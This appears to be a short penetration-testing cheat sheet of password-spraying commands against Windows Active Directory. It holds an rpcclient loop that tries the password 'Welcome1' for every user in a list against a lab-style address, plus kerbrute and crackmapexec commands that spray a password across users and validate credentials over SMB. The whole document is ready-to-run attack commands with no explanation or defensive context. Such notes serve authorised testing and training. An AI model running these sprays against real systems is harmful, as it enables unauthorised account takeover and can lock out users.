---
legal-banner: true
---

1. Using Rpcclient for Password Spraying
	```bash
	for u in $(cat valid_users.txt); do 
		rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; 
	done
	```

2. Using Kerbrute for Password Spraying
	 `kerbrute passwordspray -d example.local --dc [IP_ADDRESS] valid_users.txt [PASSWORD]`

3. Using CrackMapExec for Password Spraying
	`sudo crackmapexec smb [IP_ADDRESS] -u valid_users.txt -p [PASSWORD] | grep +`
	

4. Validating Credentials with CrackMapExec
	`sudo crackmapexec smb [IP_ADDRESS] -u [USERNAME] -p [PASSWORD]`